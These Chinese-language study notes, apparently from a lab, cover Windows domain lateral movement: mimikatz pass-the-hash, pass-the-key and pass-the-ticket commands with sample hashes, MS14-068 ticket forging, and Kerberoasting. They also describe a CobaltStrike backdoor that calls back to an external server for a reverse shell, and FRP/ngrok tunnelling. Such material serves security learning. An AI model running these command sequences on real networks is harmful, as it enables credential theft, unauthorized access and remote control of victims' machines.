<h4 id="域横向PTH-amp-PTK-amp-PTT"><a href="#域横向PTH-amp-PTK-amp-PTT" class="headerlink" title="域横向PTH&amp;PTK&amp;PTT"></a>域横向PTH&amp;PTK&amp;PTT</h4><h6 id="PTH-利用LM或NTLM的值进行的渗透测试"><a href="#PTH-利用LM或NTLM的值进行的渗透测试" class="headerlink" title="PTH  利用LM或NTLM的值进行的渗透测试"></a>PTH  利用LM或NTLM的值进行的渗透测试</h6><p>PTH在内网渗透中是一种很经典的攻击方式，原理就是攻击者可以直接通过LM Hash 和NTLM Hash访问远程主机或者服务，而不用提供明文密码</p>
<p>如果禁用了NTLM认证，PsExec无法利用获得的NTLM Hash进行远程连接，但是使用mimlata还是可以攻击成功。对于8.1&#x2F;2012r2，安装补丁kb28719987发的win7&#x2F;2008r2&#x2F;8&#x2F;2012等，可以使用费AES keys代替NT hash来实现PTK攻击</p>
<h6 id="PTT-利用票据凭证TGT进行的渗透测试"><a href="#PTT-利用票据凭证TGT进行的渗透测试" class="headerlink" title="PTT   利用票据凭证TGT进行的渗透测试"></a>PTT   利用票据凭证TGT进行的渗透测试</h6><p>可以理解为网站的cookie，就是一中和别人建立连接的凭据，利用这个凭据可以再次和别人建立连接</p>
<p>ptt攻击不是简单的NTLM认证，同时利用kerberos协议进行攻击的</p>
<p>攻击方式有ms14-068、黄金票据和白银票据</p>
<p>ms14-068的危害是允许域内任何一个普通用户，，将自己提升至域管理权限。微软给处补丁kb3011780来修复</p>
<h6 id="PTK-利用ekeys-aes256进行的渗透测试"><a href="#PTK-利用ekeys-aes256进行的渗透测试" class="headerlink" title="PTK   利用ekeys   aes256进行的渗透测试"></a>PTK   利用ekeys   aes256进行的渗透测试</h6><p>sekurlsa::ekeys得到aes256的值</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230302151158779.png"
                      alt="image-20230302151158779"
                ></p>
<h5 id="PTH传递-mimikatz"><a href="#PTH传递-mimikatz" class="headerlink" title="PTH传递-mimikatz"></a>PTH传递-mimikatz</h5><p>使用mimikatz获取密码等信息</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230302150502637.png"
                      alt="image-20230302150502637"
                ></p>
<p>在mimikatz里面使用   sekurlsa::pth（通过PTH连接） &#x2F;user（用户名）:administrator     &#x2F;domain（域名）:god       &#x2F;ntlm（哈希密码）:ccef208c6485269c20db2cad21734fe7</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230302152334981.png"
                      alt="image-20230302152334981"
                ></p>
<p>该命令是通过hash来连接到域控主机</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230302152418333.png"
                      alt="image-20230302152418333"
                ></p>
<p>即可得到控制权，然后就可以用at&amp;schtasks来进行后门的注入，如果权限不够就涉及提权了</p>
<p>对于上面提到的微软打的补丁，没有打补丁的适用于这个方法，打了补丁只能administrator连接</p>
<h5 id="利用哈希传递登入远程桌面"><a href="#利用哈希传递登入远程桌面" class="headerlink" title="利用哈希传递登入远程桌面"></a>利用哈希传递登入远程桌面</h5><p>条件：1.远程主机开启了“受限管理员”模式</p>
<p>​            2.用户位于远程主机的管理员组中</p>
<p>​            3.目标用户的哈希</p>
<p>开启”受限管理员“模式,win8.1 win server 2012 R2默认开启</p>
<p>手动开启<code>reg add &quot;HKLM\System\CurrentControlSet\Control\Lsa&quot; /v DisableRestrictedAdmin /t REG-dword /d 00000000 /f</code></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">查看是否开启“受限管理员模式”</span><br><span class="line">reg query &quot;HKLM\System\CurrentControlSet\Control\Lsa&quot; /v DisableRestrictedAdmin</span><br><span class="line">0启动    1不启动</span><br><span class="line">如果开启就可以minikatz实现</span><br><span class="line">privilege::dubug</span><br><span class="line">sekurlsa::pth /user:Administrator /domain:hack-my.com /ntlm:用minikatz获取 “/run:mstsc.exe /restrictedadmin”</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>sekurlsa::pth &#x2F;user:Administrator &#x2F;domain:hack-my.com &#x2F;ntlm:38fe728ae616f0fde13715e7c320685f “&#x2F;run:mstsc.exe&#x2F;restrictedadmin”</p>
<p>大致的原理是，哈希传递成功后执行“mstsc.exe&#x2F;restrictedadmin”</p>
<p>受限管理员运行远程桌面客户端，不需要用户名密码即可登入进去</p>
<h5 id="PTK传递-mimikatz"><a href="#PTK传递-mimikatz" class="headerlink" title="PTK传递-mimikatz"></a>PTK传递-mimikatz</h5><p>打补丁后工作组及域连接：必须打补丁后才能用户连接</p>
<p>sekurlsa::ekeys  用来获取aes</p>
<p>sekurlsa::pth  &#x2F;user:mary  &#x2F;domain:god &#x2F;aes256: d3444436d7b6c0b57a1cee8907d41fcbe35c3e46779eea77e6311c7df4aaa143</p>
<p>打补丁和没打补丁中PTH和PTK的区别</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230302160204415.png"
                      alt="image-20230302160204415"
                ></p>
<h5 id="PTT传递-MS14-068-amp-kekoo-amp"><a href="#PTT传递-MS14-068-amp-kekoo-amp" class="headerlink" title="PTT传递-MS14-068&amp;kekoo&amp;"></a>PTT传递-MS14-068&amp;kekoo&amp;</h5><h6 id="MS14068：可以实现普通用户直接获取域控system权限"><a href="#MS14068：可以实现普通用户直接获取域控system权限" class="headerlink" title="MS14068：可以实现普通用户直接获取域控system权限"></a>MS14068：可以实现普通用户直接获取域控system权限</h6><p>执行过程：</p>
<ol>
<li>查看当前sid      whoami&#x2F;user</li>
<li>mimikatz          kerberos::purge（清空当前主机中所有凭证，如果有域成员凭证会影响凭证伪造）</li>
</ol>
<p>​       mimikatz          kerberos::list         查看当前主机的凭证</p>
<p>​       mimikatz          kerberos::ptc         将票据注入到内存中</p>
<ol start="3">
<li><p>利用ms14068生成TGT数据</p>
<pre><code>ms14-068.exe -u 域成员名@域名 -s 当前域用户的sid -d 域控制器地址 -p 域成员密码
</code></pre>
</li>
</ol>
<p>.\MS14-068.exe -u <a class="link"   href="mailto:&#x6d;&#97;&#x72;&#121;&#64;&#x67;&#x6f;&#100;&#46;&#x6f;&#x72;&#x67;" >&#x6d;&#97;&#x72;&#121;&#64;&#x67;&#x6f;&#100;&#46;&#x6f;&#x72;&#x67; <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> -s S-1-5-21-1218902331-2157346161-1782232778-1124 -d 192.168.3.21 -p admin!@#45（注意前面要加.\）</p>
<p>这里发现自动创建了个<a class="link"   href="mailto:&#84;&#71;&#x54;&#95;&#x6d;&#x61;&#114;&#x79;&#64;&#x67;&#111;&#100;&#46;&#x6f;&#x72;&#x67;&#x2e;&#x63;&#99;&#97;&#99;&#104;&#101;" >&#84;&#71;&#x54;&#95;&#x6d;&#x61;&#114;&#x79;&#64;&#x67;&#111;&#100;&#46;&#x6f;&#x72;&#x67;&#x2e;&#x63;&#99;&#97;&#99;&#104;&#101; <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>文件</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/c8272f46779d193ac1693410f196eb69b09225c7.png@831w_153h_progressive.webp"
                      alt="img"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/aa8ffd123435e20eca4bcffc13b199bf460c8d2d.png@831w_104h_progressive.webp"
                      alt="img"
                ></p>
<ol start="4">
<li>票据注入内存</li>
</ol>
<p>​       mimikatz.exe “kerberos::ptc <a class="link"   href="mailto:&#84;&#71;&#x54;&#x5f;&#109;&#x61;&#114;&#x79;&#x40;&#x67;&#111;&#100;&#x2e;&#111;&#114;&#103;&#x2e;&#x63;&#x63;&#x61;&#99;&#104;&#x65;" >&#84;&#71;&#x54;&#x5f;&#109;&#x61;&#114;&#x79;&#x40;&#x67;&#111;&#100;&#x2e;&#111;&#114;&#103;&#x2e;&#x63;&#x63;&#x61;&#99;&#104;&#x65; <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>“ exit</p>
<ol start="5">
<li>然后就可以直接连接了    dir \主机名\c$</li>
</ol>
<h6 id="lodon工具"><a href="#lodon工具" class="headerlink" title="lodon工具"></a>lodon工具</h6><h4 id="域横向cobaltstrike-amp-RDP"><a href="#域横向cobaltstrike-amp-RDP" class="headerlink" title="域横向cobaltstrike&amp;RDP"></a>域横向cobaltstrike&amp;RDP</h4><p>除了IPC WMI SMB等连接方式外还可以使用RDP连接</p>
<p>RDP协议连接：判断对方远程桌面服务是否开启（默认是：3389），端口扫描可以判断</p>
<h6 id="RDP明文密码连接"><a href="#RDP明文密码连接" class="headerlink" title="RDP明文密码连接"></a>RDP明文密码连接</h6><p>win+r  运行mstsc</p>
<p>输入域控主机IP地址，然后用户名，再用获取到的密码远程连接（鸡肋用不到，连不上，cao！）</p>
<p>也可以使用命令行来连接</p>
<p>—mstsc.exe &#x2F;console &#x2F;v:192.168.3.21 &#x2F;admin</p>
<p>—对linux来说: rdesktop 192.168.3.21:3389 </p>
<h6 id="RDP密文HASH链接"><a href="#RDP密文HASH链接" class="headerlink" title="RDP密文HASH链接"></a>RDP密文HASH链接</h6><p>—windows Server需要开启 Restricted Admin mode，在Windows 8.1和Windows Server 2012 R2中默认开启，同时如果Win 7 和Windows Server 2008 R2安装了2871997、2973351补丁也支持</p>
<p>—REG ADD “HKLM\System\CurrentControlSet\Control\Lsa” &#x2F;v DisableRestrictedAdmin &#x2F;t REG_DWORD &#x2F;d 00000000 &#x2F;f </p>
<p>然后运行mstsc.exe &#x2F;restrictedadmin</p>
<h6 id="域横向移动SPN服务-探针-请求-导出-破解-重写"><a href="#域横向移动SPN服务-探针-请求-导出-破解-重写" class="headerlink" title="域横向移动SPN服务-探针-请求-导出-破解-重写"></a>域横向移动SPN服务-探针-请求-导出-破解-重写</h6><p>SPN：服务主体名称是kerberos客户端用于唯一标识给特定的kerberos目标计算机的服务实例名称（类似于token）</p>
<p>Kerberos身份验证使用SPN将服务实例和服务的登入账户相关联，如果安装多个服务实例，每一个实例都需要有自己唯一的SPN</p>
<h6 id="探针"><a href="#探针" class="headerlink" title="探针"></a>探针</h6><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">在获取的域内主机中cmd  输入  setspn -q */*  (扫描全部，这里每个域用户对应的SPN服务都有)</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230303134627617.png"
                     
                ></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">寻找特定sSPN服务   setspn -q */* |findstr“MSSQL”</span><br></pre></td></tr></table></figure></div>

<h6 id="请求"><a href="#请求" class="headerlink" title="请求"></a>请求</h6><p>先使用klist purge删除原有票据</p>
<p>（power shell）     Add-Type -AssemblyName System.IdentityModel</p>
<p>再使用这个</p>
<p> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList “MSSQLSvc&#x2F;fileserv.god.org:1433（服务名探针可找到）” </p>
<h6 id="导出"><a href="#导出" class="headerlink" title="导出"></a>导出</h6><p>使用mimikatz导出</p>
<p>kerberos::list &#x2F;export</p>
<h6 id="破解"><a href="#破解" class="headerlink" title="破解"></a>破解</h6><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230303140921568.png"
                      alt="image-20230303140921568"
                ></p>
<p>破解工具tgsrepcrack.py破解服务票据（python3环境）</p>
<p>—将以mssql开头的文件拖到本地Kerberos进行密码爆破</p>
<p>—kerberoast下载（专门针对Kerberos协议，tgsrepcrack.py是其中一个脚本）：<a class="link"   href="https://github.com/nidem/kerberoast" >https://github.com/nidem/kerberoast <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> </p>
<p>首先创建一个密码字典</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/4827547fb5b70b382c2f60dda7fc23006eeefe3b.png@366w_191h_progressive.webp"
                      alt="img" style="zoom:150%;" 
                >

<p>然后使用爆破脚本tgsrepcrack.py（要先pip install pysn1）</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/9500bea8926429dd8e55b5d56133649c3a17d190.png@831w_209h_progressive.webp"
                      alt="img" style="zoom:150%;" 
                >

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230303140552385.png"
                      alt="image-20230303140552385"
                ></p>
<p>得到密码</p>
<h6 id="重写"><a href="#重写" class="headerlink" title="重写"></a>重写</h6><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230303141012726.png"
                      alt="image-20230303141012726"
                ></p>
<p>主要原理就是将得到的票据重写（伪造票据），然后将其通过mimikatz注入到内存中即可</p>
<p>注入之后就可以连接靶机：</p>
<p>dir &#x2F;&#x2F;xxx.xxx.xxx.xxx&#x2F;c$(查看靶机c盘文件)</p>
<h6 id="CobaltStrike工具使用"><a href="#CobaltStrike工具使用" class="headerlink" title="CobaltStrike工具使用"></a>CobaltStrike工具使用</h6><p>大概流程：启动-配置-监听-执行-上线-提权-信息收集-渗透</p>
<p>在服务器中（外网环境）安装CobaltStrike并且提前配置Java环境</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">java环境安装教程</span><br><span class="line">sudo apt install openjdk-11-jdk</span><br></pre></td></tr></table></figure></div>

<p>启动服务端（服务器启动）</p>
<p>.&#x2F;teamserve ‘本服务器IP’ ‘团队接入的口令可以随便写’</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/f5893e5a1ced0b278f9bf8219aeea5c3d45ec8fe.png@831w_96h_progressive.webp"
                      alt="img"
                ></p>
<p>服务器端需要root权限，要在云端服务器打开50050端口</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/b29af5915adc8765aef8736aeb3fc0ce1b12b702.png@513w_245h_progressive.webp"
                      alt="img"
                ></p>
<p>本地计算机启动<strong>CobaltStrike</strong>中的start.bat开启，并且配置在服务器上填写的ip和端口，user随便输</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/d3825132a2697f24040c20f46c1eae4eb289fddc.png@708w_215h_progressive.webp"
                      alt="img"
                ></p>
<p>这个工具与msf最大的区别就是支持多个人一同协作</p>
<p>由于是多人协作所以要区分哪些资源是各自的，通过配置监听器来实现拥有各自的监听管道（后门传输管道）</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/e519023d26a41d147744dbad80057c812f062127.png@831w_468h_progressive.webp"
                      alt="img"
                ></p>
<p>监听器具有多种协议，常见的有：dns&#x2F;http&#x2F;smb&#x2F;c2</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/439e27ed691d00b293fd87de347187923edc72fa.png@453w_192h_progressive.webp"
                      alt="img"
                ></p>
<p>ip和端口就是shell要返回的地址（在这里只能是外网服务器）</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/fcfb0947f8b466c569e7ffb5235cf4d8dd75fe86.png@702w_342h_progressive.webp"
                      alt="img"
                ></p>
<p>创建成功后，生成可执行文件（有不同的格式，选择windows64位的exe）</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/9f141d34e95c100ddb1669790fe7b8107235589c.png@429w_219h_progressive.webp"
                      alt="img"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/56937c29ac696ccbdce40aa6955b6e0cbcab644c.png@554w_255h_progressive.webp"
                      alt="img"
                ></p>
<p>将生成的的后门exe复制到域靶机中运行，就会反弹靶机的shell</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/259a810e6ab3fa04238cdfaa1f0195f41152e7ab.png@831w_180h_progressive.webp"
                      alt="img"
                ></p>
<p>进入图形化界面右击鼠标选择interact，即可调出命令窗口</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/73f6087005ee9f00460eb30c35d23c2770a8c509.png@512w_167h_progressive.webp"
                      alt="img"
                ></p>
<p>输入shell ipconfig查看ip配置</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/f5be55a7b9ba803a584034c62568fb5b545d42fe.png@831w_291h_progressive.webp"
                      alt="img"
                ></p>
<p>在图形化界面进行提权操作（自带提权插件太少需要自己安装插件）</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/e68e4c13f949649acddba433fea1c8deec0795da.png@633w_263h_progressive.webp"
                      alt="img"
                ></p>
<h6 id="关于提权及插件加载"><a href="#关于提权及插件加载" class="headerlink" title="关于提权及插件加载"></a>关于提权及插件加载</h6><p>以下使用的提权插件为：taowu-cobalt-strike 和Erebus</p>
<p>点击加载插件</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/86a402e6e9fc6a06e9383a92610ecc33d2d8a63c.png@831w_416h_progressive.webp"
                      alt="img"
                ></p>
<p>加载第三方提权模块，发现提权模块变多了，选择m14-508</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/1c08beee62ad0b7d58050752403fdb5409f3bfb1.png@551w_173h_progressive.webp"
                      alt="img"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/4e78a21c07c34979a5781061f2e26575425932c7.png@594w_254h_progressive.webp"
                      alt="img"
                ></p>
<p>！！！！m14-508漏洞描述</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/e83ce667d677ebf25a26d314969df09f77edc755.png@831w_240h_progressive.webp"
                      alt="img"
                ></p>
<p>即可提升至system权限</p>
<h6 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h6><p>在命令终端输入net view探活主机</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/2971a9d0399b422bb43fa9f3fc97785758f767da.png@831w_177h_progressive.webp"
                      alt="img"
                ></p>
<p>点击view中targets将探针的主机显示出来</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/7e380d0b68d3ead9bf5b78b04b78c61e7ff9c77d.png@831w_299h_progressive.webp"
                      alt="img"
                ></p>
<p>也可以用批量代码执行</p>
<p>— for &#x2F;L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.3.%I | findstr “TTL&#x3D;”</p>
<p>提权成功之后就可以，导出hash值，利用mimikatz进行横向渗透，也可以上传后门工具进行进一步攻击。如Ladon啥的工具</p>
<p>这个指令可以直接获得域控的地址net dclist</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230304135454384.png"
                      alt="image-20230304135454384"
                ></p>
<p>CobaltStrike Aggressor 脚本合集（可以自行在GitHub搜索）：</p>
<p><a class="link"   href="https://github.com/harleyQu1nn/AggressorScripts" >https://github.com/harleyQu1nn/AggressorScripts <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://github.com/Und3rf10w/Aggressor-scripts" >https://github.com/Und3rf10w/Aggressor-scripts <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://github.com/001SPARTaN/aggressor_scripts" >https://github.com/001SPARTaN/aggressor_scripts <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://github.com/rasta-mouse/Aggressor-Script" >https://github.com/rasta-mouse/Aggressor-Script <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://github.com/threatexpress/aggressor-scripts" >https://github.com/threatexpress/aggressor-scripts <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://github.com/ramen0x3f/AggressorScripts" >https://github.com/ramen0x3f/AggressorScripts <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://github.com/FortyNorthSecurity/AggressorAssessor" >https://github.com/FortyNorthSecurity/AggressorAssessor <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://github.com/michalkoczwara/aggressor_scripts_collection" >https://github.com/michalkoczwara/aggressor_scripts_collection <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://github.com/ars3n11/Aggressor-Scripts" >https://github.com/ars3n11/Aggressor-Scripts <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://github.com/gaudard/scripts/tree/master/red-team/aggressor" >https://github.com/gaudard/scripts/tree/master/red-team/aggressor <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://github.com/bluscreenofjeff/AggressorScripts" >https://github.com/bluscreenofjeff/AggressorScripts <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://github.com/vysecurity/Aggressor-VYSEC" >https://github.com/vysecurity/Aggressor-VYSEC <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://github.com/killswitch-GUI/CobaltStrike-ToolKit" >https://github.com/killswitch-GUI/CobaltStrike-ToolKit <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://github.com/rsmudge/ElevateKit" >https://github.com/rsmudge/ElevateKit <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> （第三方提权攻击）</p>
<p><a class="link"   href="https://github.com/QAX-A-Team/CobaltStrike-Toolset" >https://github.com/QAX-A-Team/CobaltStrike-Toolset <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://github.com/DeEpinGh0st/Erebus" >https://github.com/DeEpinGh0st/Erebus <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> （Erebus CobaltStrike后渗透测试插件，持续更新）（本文选择的插件）</p>
<p><a class="link"   href="https://github.com/branthale/CobaltStrikeCNA" >https://github.com/branthale/CobaltStrikeCNA <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://github.com/pandasec888/taowu-cobalt-strike%EF%BC%88%E6%9C%AC%E6%96%87%E9%80%89%E6%8B%A9%E7%9A%84%E6%8F%92%E4%BB%B6%EF%BC%89" >https://github.com/pandasec888/taowu-cobalt-strike（本文选择的插件） <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h4 id="域横向内网漫游socks代理隧道技术"><a href="#域横向内网漫游socks代理隧道技术" class="headerlink" title="域横向内网漫游socks代理隧道技术"></a>域横向内网漫游socks代理隧道技术</h4><h6 id="内网：具有私有网段地址，如10-x2F-8，172-16-x2F-12，192-168-x2F-16等这些可称为内网网段"><a href="#内网：具有私有网段地址，如10-x2F-8，172-16-x2F-12，192-168-x2F-16等这些可称为内网网段" class="headerlink" title="内网：具有私有网段地址，如10&#x2F;8，172.16&#x2F;12，192.168&#x2F;16等这些可称为内网网段"></a>内网：具有私有网段地址，如10&#x2F;8，172.16&#x2F;12，192.168&#x2F;16等这些可称为内网网段</h6><h6 id="正向连接和反向连接"><a href="#正向连接和反向连接" class="headerlink" title="正向连接和反向连接"></a>正向连接和反向连接</h6><p>正向：控制端连接被控制端</p>
<p>反向：被控制端去连接控制端</p>
<p>在内网环境中是不能被外网主动发现连接的，所以这时候就需要通过内网主动反向的连接外网控制端</p>
<h6 id="代理和隧道的区别"><a href="#代理和隧道的区别" class="headerlink" title="代理和隧道的区别"></a>代理和隧道的区别</h6><p>代理：主要是解决了网络的连通性问题，但是有些防火墙就会设置禁止代理的相关协议，这时候就需要隧道</p>
<p>隧道：可以认为是代理的高级版，它利用了协议的伪装，可以解决流量分析和监控工具，和防火墙等一系列相关工具的过滤问题</p>
<h5 id="内网穿透Ngrok测试演示-两个内网通讯上线"><a href="#内网穿透Ngrok测试演示-两个内网通讯上线" class="headerlink" title="内网穿透Ngrok测试演示-两个内网通讯上线"></a>内网穿透Ngrok测试演示-两个内网通讯上线</h5><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230304154406960.png"
                      alt="image-20230304154406960"
                ></p>
<p>试想以下两个内网中，互补相通该怎么交换数据？？</p>
<p>能想到的是交给一个中间人帮忙传递，这就跟代理类似，利用一个云主机做代理帮助两个内网主机传递数据</p>
<p>由于没有ngrok，这里引用别人的笔记</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230304205653387.png"
                      alt="image-20230304205653387" style="zoom:150%;" 
                >

<p>kali作为控制端，运行ngrok的客户端，并且利用msf生成后门文件进行上传来实现反弹shell，利用的是代理服务器的中转功能</p>
<p>这个后门文件主要是将内网靶机的shell发送至代理服务器，然后再由代理服务器反弹shell至外网攻击机</p>
<p>主要步骤：攻击机连接代理服务器—-&gt;msf生成一个后门文件植入靶机（收集的信息发送至代理服务器）—-&gt;代理服务器又将信息反弹至攻击机</p>
<h6 id="内网穿透Frp自建跳板测试-两个内网通讯上线"><a href="#内网穿透Frp自建跳板测试-两个内网通讯上线" class="headerlink" title="内网穿透Frp自建跳板测试-两个内网通讯上线"></a>内网穿透Frp自建跳板测试-两个内网通讯上线</h6><p>Frp是现在比较主流的工具，分为服务端（中转的服务器）和控制端（攻击机和靶机）</p>
<p>FRP下载地址：<a class="link"   href="https://github.com/fatedier/frp/releases" >https://github.com/fatedier/frp/releases <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> </p>
<p>服务端：下载-解压-修改-启动（对于阿里云主机要修改安全组配置出入口）</p>
<p>将下载好的包上传到服务器，并且解压frp包</p>
<h6 id="实战环境"><a href="#实战环境" class="headerlink" title="实战环境"></a>实战环境</h6><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230313081434957.png"
                      alt="image-20230313081432510"
                ></p>
<p>网络一级代理</p>
<p>已经获得win server 2012的控制权，需要继续登陆FTP服务器</p>
<p>1.利用VPS作为FRP的服务端，执行</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">./frps.exe -c ./frps.ini</span><br></pre></td></tr></table></figure></div>

<p>配置frps.ini文件如下</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_addr = 0.0.0.0         服务端上绑定的IP地址</span><br><span class="line">bind-PORT = 7000            服务端绑定的端口</span><br></pre></td></tr></table></figure></div>

<p>2.win server 2012作为客户端，执行</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">./frpc.exe -c ./frpc.ini</span><br></pre></td></tr></table></figure></div>

<p>客户端文件frpc.ini配置如下</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr = 192.168.2.x     服务端的IP地址</span><br><span class="line">server_port = 7000            服务端的开放端口</span><br><span class="line">[socks5]</span><br><span class="line">remote_port = 1000            代理所使用的端口，会被转发到服务端</span><br><span class="line">plugin = socks5               代理的类型</span><br></pre></td></tr></table></figure></div>

<p>至此输入</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">proxychains ssh root@10.10.10.15      便可成功登入FTP服务器</span><br></pre></td></tr></table></figure></div>



<p>二级网络代理</p>
<p>同样先VPS作为服务端，启动</p>
<p>win server2012作为客户端启动</p>
